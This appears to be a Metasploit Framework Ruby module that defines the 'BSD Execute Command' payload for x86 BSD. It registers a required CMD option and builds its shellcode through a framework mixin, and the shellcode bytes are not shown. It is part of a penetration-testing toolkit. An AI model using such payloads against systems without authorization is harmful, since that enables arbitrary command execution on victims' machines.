##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# Exec
# ----
#
# Executes an arbitrary command.
#
###
module MetasploitModule

  CachedSize = 24

  include Msf::Payload::Single
  include Msf::Payload::Bsd

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'BSD Execute Command',
      'Description' => 'Execute an arbitrary command',
      'Author'      => [
        'snagg <snagg[at]openssl.it>',
        'argp <argp[at]census-labs.com>',
        'joev'
      ],
      'License'     => BSD_LICENSE,
      'Platform'    => 'bsd',
      'Arch'        => ARCH_X86
    ))

    # Register exec options
    register_options([
      OptString.new('CMD',  [ true,  "The command string to execute" ]),
    ])
  end

  #
  # Dynamically builds the exec payload based on the user's options.
  #
  def generate_stage(opts={})
    bsd_x86_exec_payload
  end
end
